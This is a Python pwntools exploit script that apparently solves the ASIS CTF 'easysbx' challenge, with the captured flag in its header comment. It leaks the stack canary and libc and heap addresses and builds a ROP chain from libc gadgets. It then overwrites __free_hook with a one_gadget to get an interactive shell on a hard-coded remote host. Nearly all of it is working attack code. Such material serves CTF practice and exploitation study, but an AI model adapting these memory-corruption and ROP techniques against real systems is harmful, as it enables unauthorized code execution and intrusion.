# ASIS{9358C3E1AF3077977DACBBEDEB93269D}
from pwn import *

elf = ELF("./easysbx_sym")
libc = elf.libc

def sla(s, d):
	target.sendlineafter(s, d)

def snd(data):
	sla(": ", "1")
	sla(": ", "-1")
	target.send(data)

def rcv():
	sla(": ", "2")

def leave():
	sla(": ", "3")

#target = elf.process()
target = remote("65.108.188.88", 41010)
#gdb.attach(target, 'b fclose\nb kill')
#target = gdb.debug("./easysbx", 'set follow-fork-mode child')

snd("A"*0x109)
rcv()
target.recvuntil("A"*0x109)
canary = "\x00" + target.recv(7)
log.info("Canary: " + hex(u64(canary)))

snd("A"*0x128)
rcv()
target.recvuntil("A"*0x128)
libc_base = u64(target.recv(6) + "\x00"*2) - libc.sym['__libc_start_main'] - 243
log.info("LIBC Base: " + hex(libc_base))

pop_rax = p64(libc_base + 0x000000000004a550)
pop_rdi = p64(libc_base + 0x0000000000026b72)
pop_rsi = p64(libc_base + 0x0000000000027529)
set_rdx = p64(libc_base + 0x00000000000a2148)	# 0x00000000000a2148 : mov rdx, r12 ; pop r12 ; pop r13 ; ret
pop_r12 = p64(libc_base + 0x0000000000032b59)
sys_ret = p64(libc_base + 0x0000000000066229)
#lve_ret = p64(libc_base + 0x000000000005aa48)
sav_gad = p64(libc_base + 0x000000000014b226)	# 0x000000000014b226 : mov qword ptr [rsi + 8], rax ; ret

_buffer = libc_base + libc.sym['__malloc_hook']

FILEOPEN = 0
FILEREAD = 1
FILECLOSE = 2
READBUFF = 3
WRITEBUFF = 4
ALLOCBUFF = 5

def gen_sys(rax, rdi, rsi=_buffer):
	return pop_rax + p64(rax) + pop_rdi + p64(rdi) + pop_rsi + p64(rsi) + sys_ret

payload = "A"*0x108 + canary + "A"*0x8

payload += pop_rdi + p64(0x80)
payload += p64(libc_base + libc.sym['malloc'])
payload += pop_rsi + p64(libc_base + libc.sym['__malloc_hook'] - 8)
payload += sav_gad
payload += pop_r12 + p64(0x300) + set_rdx + p64(0)*2
payload += gen_sys(1, 1)

payload += gen_sys(0, 0)
payload += gen_sys(1, 4, _buffer + 0x00)
payload += gen_sys(1, 4, _buffer + 0x10)
payload += gen_sys(1, 4, _buffer + 0x20)
payload += gen_sys(1, 4, _buffer + 0x30)
payload += gen_sys(1, 4, _buffer + 0x40)
payload += gen_sys(1, 4, _buffer + 0xe0)
#payload += gen_sys(1, 4, _buffer + 0xf0)
payload += gen_sys(1, 4, _buffer + 0x100)
payload += gen_sys(1, 4, _buffer + 0x110)
payload += gen_sys(1, 4, _buffer + 0x120)
payload += gen_sys(1, 4, _buffer + 0x220)
payload += gen_sys(1, 4, _buffer + 0x230)
payload += gen_sys(1, 4, _buffer + 0x240)
payload += gen_sys(1, 4, _buffer + 0x250)
payload += gen_sys(1, 4, _buffer + 0xe0)
#payload += gen_sys(0, 5, _buffer - 0x10)
#payload += gen_sys(1, 1, _buffer - 0x10)

snd(payload + "\n")

leave()

heap_base = u64(target.recv(8)) - 0x1370
log.info("HEAP Base: " + hex(heap_base))

cmds = p32(FILEOPEN) + "lol\x00" + p32(0x78)
cmds += p32(FILECLOSE)*3
cmds += p32(ALLOCBUFF)*2 + p32(0x1d0)
cmds += p32(READBUFF)*2 + p32(8*20)
cmds += "/bin/sh\x00" + "B"*8 + "C"*8 + "D"*8 + "E"*8 + "F"*8 + "G"*8 + "H"*8 + "I"*8 + p64(heap_base + 0x10) + "K"*8 + "L"*8 + p64(libc_base + libc.sym['__malloc_hook']) + "N"*8 + "O"*8 + "P"*8 + "Q"*8 + p64(libc_base - 0x28c0 - 8) + "S"*8 + "T"*8
cmds += p32(FILECLOSE)*3
cmds += p32(FILEOPEN) + "lol\x00" + p32(0x78)
cmds += p32(ALLOCBUFF)*2 + p32(0x280)
cmds += p32(READBUFF)*2 + p32(0x100)
cmds += p64(libc_base + libc.sym['__free_hook'])*(0x100/8)
cmds += p32(ALLOCBUFF)*2 + p32(0x20)
cmds += p32(READBUFF)*2 + p32(8)
cmds += p64(libc_base + 0xe6c7e)
#cmds += p32(ALLOCBUFF)*2 + p32(0x20)
cmds += p64(FILECLOSE)*3

target.sendline(cmds)

target.interactive()
